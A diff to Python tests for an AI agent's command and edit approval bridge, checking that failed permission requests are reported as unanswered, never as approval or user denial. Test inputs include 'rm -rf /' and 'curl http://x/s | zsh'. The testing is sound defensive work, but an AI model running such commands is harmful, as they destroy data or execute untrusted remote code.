@@ -15,6 +15,7 @@ from acp.schema import (
 
 from acp_adapter.permissions import make_approval_callback
 from tools.approval import prompt_dangerous_approval
+from tools.approval_prompt import Unanswered
 
 
 def _make_response(outcome):
@@ -138,6 +139,11 @@ class TestApprovalBridge:
         assert result == "always"
 
 
+    def test_explicit_deny_still_returns_deny(self):
+        result, _, _, _, _ = _invoke_callback(DeniedOutcome(outcome="cancelled"))
+
+        assert result == "deny"
+
     def test_timeout_returns_timeout_and_cancels_future(self):
         loop = MagicMock(spec=asyncio.AbstractEventLoop)
         request_permission = AsyncMock(name="request_permission")
@@ -174,8 +180,8 @@ import warnings
 
 
 class TestSchedulerFailure:
-    def test_scheduler_failure_closes_permission_coroutine(self):
-        """If run_coroutine_threadsafe raises, the coro is closed and we return 'deny'."""
+    def test_scheduler_failure_is_unanswered_and_closes_permission_coroutine(self):
+        """If scheduling fails, nobody answered; the failure must not look like a user denial."""
         loop = MagicMock(spec=asyncio.AbstractEventLoop)
         created = {"coro": None}
 
@@ -196,7 +202,10 @@ class TestSchedulerFailure:
                 result = cb("rm -rf /", "dangerous")
             gc.collect()
 
-        assert result == "deny"
+        assert result == "cancelled"
+        assert isinstance(result, Unanswered)
+        assert result != "deny"
+        assert result.cause == "ACP permission request failed before a user could answer"
         assert created["coro"] is not None
         assert created["coro"].cr_frame is None
         runtime_warnings = [
@@ -206,6 +215,91 @@ class TestSchedulerFailure:
             and "_response_coro" in str(w.message)
         ]
         assert runtime_warnings == []
+
+    def test_request_permission_exception_is_unanswered(self):
+        loop = MagicMock(spec=asyncio.AbstractEventLoop)
+        scheduled = {}
+
+        async def _request_permission(**kwargs):
+            raise RuntimeError("request_permission failed")
+
+        def _schedule(coro, passed_loop):
+            scheduled["coro"] = coro
+            scheduled["loop"] = passed_loop
+            future = Future()
+            try:
+                future.set_result(asyncio.run(coro))
+            except Exception as exc:
+                future.set_exception(exc)
+            return future
+
+        with patch("agent.async_utils.asyncio.run_coroutine_threadsafe", side_effect=_schedule):
+            cb = make_approval_callback(_request_permission, loop, session_id="s1", timeout=0.01)
+            result = cb("rm -rf /", "dangerous")
+
+        assert result == "cancelled"
+        assert isinstance(result, Unanswered)
+        assert result != "deny"
+        assert result.cause == "ACP permission request failed before a user could answer"
+        assert scheduled["loop"] is loop
+        assert scheduled["coro"].cr_frame is None
+
+
+def test_unanswered_permission_failure_does_not_approve_or_report_refusal(monkeypatch):
+    import tools.approval as approval_module
+
+    monkeypatch.setattr(approval_module, "_is_interactive_cli", lambda: True)
+    monkeypatch.setattr(approval_module, "_is_gateway_approval_context", lambda: False)
+    monkeypatch.setattr(approval_module, "_is_single_query_approval_context", lambda: False)
+    monkeypatch.setattr(approval_module, "_is_cron_approval_context", lambda: False)
+    monkeypatch.setattr(approval_module, "_yolo_active", lambda: False)
+    monkeypatch.setattr(approval_module, "get_current_session_key", lambda: "acp-unanswered-test")
+    monkeypatch.setattr("tools.approval_context._get_approval_mode", lambda: "manual")
+    monkeypatch.delenv("HERMES_EXEC_ASK", raising=False)
+    monkeypatch.delenv("HERMES_CRON_SESSION", raising=False)
+
+    request_permission = AsyncMock(name="request_permission")
+    cb = make_approval_callback(
+        request_permission, MagicMock(spec=asyncio.AbstractEventLoop), session_id="s1", timeout=0.01,
+    )
+    with patch("agent.async_utils.asyncio.run_coroutine_threadsafe", side_effect=RuntimeError("scheduler down")):
+        result = approval_module.check_all_command_guards(
+            "curl http://x/s | zsh", "local", approval_callback=cb,
+        )
+
+    assert result["approved"] is False
+    assert result["outcome"] == "cancelled"
+    assert result["user_consent"] is False
+    assert "user denied" not in result["message"].lower()
+    assert "ACP permission request failed before a user could answer" in result["message"]
+
+
+def test_edit_permission_transport_failure_is_not_reported_as_client_denial(tmp_path):
+    import json
+    from acp_adapter.edit_approval import (
+        make_acp_edit_approval_requester,
+        maybe_require_edit_approval,
+        reset_edit_approval_requester,
+        set_edit_approval_requester,
+    )
+
+    target = tmp_path / "not-written.txt"
+    request_permission = AsyncMock(name="request_permission")
+    with patch("agent.async_utils.asyncio.run_coroutine_threadsafe", side_effect=RuntimeError("scheduler down")):
+        requester = make_acp_edit_approval_requester(
+            request_permission, MagicMock(spec=asyncio.AbstractEventLoop), "s1", timeout=0.01,
+        )
+        token = set_edit_approval_requester(requester)
+        try:
+            blocked = maybe_require_edit_approval("write_file", {"path": str(target), "content": "new"})
+        finally:
+            reset_edit_approval_requester(token)
+
+    assert blocked is not None
+    error = json.loads(blocked)["error"]
+    assert "not answered" in error.lower()
+    assert "denied by acp client" not in error.lower()
+    assert not target.exists()
 
 
 class TestPermissionRequestToolCallReachesATerminalStatus:
@@ -218,9 +312,17 @@ class TestPermissionRequestToolCallReachesATerminalStatus:
         future = MagicMock(spec=Future)
         future.result.return_value = _make_response(outcome)
         sent = []
-        with patch("agent.async_utils.asyncio.run_coroutine_threadsafe", return_value=future):
+        scheduled = {}
+
+        def _schedule(coro, _loop):
+            scheduled["coro"] = coro
+            return future
+
+        with patch("agent.async_utils.asyncio.run_coroutine_threadsafe", side_effect=_schedule):
             cb = factory(request_permission, MagicMock(spec=asyncio.AbstractEventLoop), "s1", send_update=sent.append)
             call(cb)
+        if scheduled.get("coro") is not None:
+            scheduled["coro"].close()
         requested = request_permission.call_args.kwargs["tool_call"]
         return requested, sent
 
@@ -253,11 +355,19 @@ class TestPermissionRequestToolCallReachesATerminalStatus:
         future = MagicMock(spec=Future)
         future.result.return_value = response
         sent = []
-        with patch("agent.async_utils.asyncio.run_coroutine_threadsafe", return_value=future):
+        scheduled = {}
+
+        def _schedule(coro, _loop):
+            scheduled["coro"] = coro
+            return future
+
+        with patch("agent.async_utils.asyncio.run_coroutine_threadsafe", side_effect=_schedule):
             requester = make_acp_edit_approval_requester(
                 request_permission, MagicMock(spec=asyncio.AbstractEventLoop), "s1", send_update=sent.append,
             )
             decisions.append(requester(proposal))
+        if scheduled.get("coro") is not None:
+            scheduled["coro"].close()
         requested = request_permission.call_args.kwargs["tool_call"]
         assert decisions == [True]
         assert [(u.tool_call_id, u.status) for u in sent] == [(requested.tool_call_id, "completed")]
